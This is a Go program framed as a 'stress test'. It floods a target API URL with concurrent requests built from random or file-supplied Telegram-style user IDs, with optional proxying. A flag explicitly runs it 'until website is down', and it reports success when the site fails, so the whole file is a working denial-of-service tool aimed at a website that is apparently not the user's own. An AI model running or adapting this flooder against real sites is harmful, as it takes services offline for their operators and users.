package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

var (
	apiURL    string
	useFile   bool
	attack    bool
	enableLog bool
	proxyURL  string
	threads   int
	userIDs   []string
	logMutex  sync.Mutex
	stopTest  bool
	client    *http.Client
)

type LogEntry struct {
	ID        string `json:"id"`
	Status    int    `json:"status"`
	TimeMS    int64  `json:"time_ms"`
	Timestamp string `json:"timestamp"`
}

func init() {
	flag.StringVar(&apiURL, "url", "", "API URL (required)")
	flag.BoolVar(&useFile, "usefile", false, "Use users.txt for user IDs")
	flag.BoolVar(&attack, "A", false, "Run until website is down")
	flag.BoolVar(&enableLog, "log", false, "Enable logging to stress_test.log")
	flag.StringVar(&proxyURL, "proxy", "", "Proxy URL (optional, e.g., http://127.0.0.1:8080)")
	flag.IntVar(&threads, "threads", 50, "Number of concurrent requests")
	flag.Parse()

	if apiURL == "" {
		fmt.Println("Usage: go run main.go -url=https://website/api/v1.php?id= [-usefile] [-A] [-log] [-proxy=http://127.0.0.1:8080] [-threads=50]")
		os.Exit(1)
	}

	if useFile {
		loadUserIDs("users.txt")
	}

	setupHTTPClient()
}

// Load user IDs from users.txt
func loadUserIDs(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening users.txt:", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		userIDs = append(userIDs, scanner.Text())
	}
}

// Generate a random Telegram user ID
func randomUserID() string {
	return fmt.Sprintf("%d", rand.Intn(9999999999-1000000000)+1000000000)
}

// Setup HTTP client with optional proxy
func setupHTTPClient() {
	transport := &http.Transport{}
	if proxyURL != "" {
		proxy, err := url.Parse(proxyURL)
		if err != nil {
			fmt.Println("Invalid proxy URL:", err)
			os.Exit(1)
		}
		transport.Proxy = http.ProxyURL(proxy)
	}
	client = &http.Client{Transport: transport}
}

// Perform API request and log response
func makeRequest(id string, wg *sync.WaitGroup) {
	defer wg.Done()

	start := time.Now()
	resp, err := client.Get(apiURL + id)
	duration := time.Since(start).Milliseconds()

	entry := LogEntry{
		ID:        id,
		TimeMS:    duration,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	if err != nil {
		entry.Status = 0 // Connection error
		stopTest = true  // Mark website as down
	} else {
		entry.Status = resp.StatusCode
		resp.Body.Close()
		if resp.StatusCode >= 500 {
			stopTest = true // Server error means site is failing
		}
	}

	if enableLog {
		logResponse(entry)
	}
}

// Log the response to a file
func logResponse(entry LogEntry) {
	logMutex.Lock()
	defer logMutex.Unlock()

	file, err := os.OpenFile("stress_test.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening log file:", err)
		return
	}
	defer file.Close()

	jsonData, _ := json.Marshal(entry)
	file.WriteString(string(jsonData) + "\n")
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, threads)

	for attack || !stopTest { // Run until website stops
		semaphore <- struct{}{}

		wg.Add(1)
		var id string

		if useFile && len(userIDs) > 0 {
			id = userIDs[rand.Intn(len(userIDs))] // Pick from users.txt
		} else {
			id = randomUserID() // Generate a random ID
		}

		go func(id string) {
			makeRequest(id, &wg)
			<-semaphore
		}(id)
	}

	wg.Wait()
	fmt.Println("Website is down. Stress test stopped.")
}
